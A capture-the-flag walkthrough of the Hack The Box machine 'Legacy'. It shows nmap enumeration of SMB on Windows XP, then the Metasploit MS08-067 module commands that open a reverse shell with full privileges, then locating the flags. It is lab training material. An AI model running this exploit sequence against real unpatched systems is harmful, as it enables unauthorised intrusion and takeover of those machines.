## Legacy Walkthrough

This is a walkthrough for the second HTB machine, Legacy. Legacy is an easy rated machine that shows how to exploit an unpatched Windows XP machine. It is still common to find machines running unpatched Windows XP, and this box highlights the importance of patch management due to how simple it is to get root access.

![Legacy (1)](https://user-images.githubusercontent.com/126024971/221581795-e7d4d2fa-d4f2-4e69-be8d-b6e7f2ffcf90.png)

---

### Enumeration

IP Address: 10.129.227.181

I started with an nmap scan of the target.

`Nmap -T4 -A 10.129.227.181`

The scan found three open ports:

135 - msrpc

139 - netbios-ssn

445 - microsoft-ds

![image](https://user-images.githubusercontent.com/126024971/221582537-64f2ff71-7949-47ff-8234-f2122d9fea84.png)

The machine is also running SMB

Interestingly, the machine is running Windows XP, so exploiting the target will be simple.

Since SMB is running on a Windows XP machine, it is likely vulnerable. There is a script that nmap can use to find SMB exploits:

`Nmap -p 445 –script smb-vuln-* 10.129.227.181`

![image](https://user-images.githubusercontent.com/126024971/221583139-9e47d99c-0cc4-4956-bc8e-8c30643b6a08.png)

The script found 2 possible exploits:

MS08-067

MS17-010

The official write-up for Legacy says to use the MS08-067 exploit. MS17-010 is Eternal Blue, but the vulnerability will only run on 64 bit machines and this is a 32 bit machine (I found this out by trying to run Eternal Blue). Therefore, we will use the MS08-067 exploit.

---

### Exploitation

Run the following commands:

`Msfconsole`

`Use exploit/windows/smb/ms08_067_netapi`

`Show options`

`Set RHOSTS 10.129.227.181`

`Set LHOST YOUR-IP-ADDRESS`

`run`

After running the exploit, we get a reverse shell with root access to the machine:

![image](https://user-images.githubusercontent.com/126024971/221587957-2ef9e2a0-97f4-4e0c-af91-c741c0de1504.png)

---

### Getting the Flags

The flags were easy to locate. The user flag is held within the Desktop of the "john" account, and the root flag is on the Administrator Desktop.

![image](https://user-images.githubusercontent.com/126024971/221594384-44b28f65-0fbf-459d-81f2-6fefc0e3200e.png)

![image](https://user-images.githubusercontent.com/126024971/221594699-2ce9b699-0a25-46a6-9a1b-9fb123ee48a0.png)

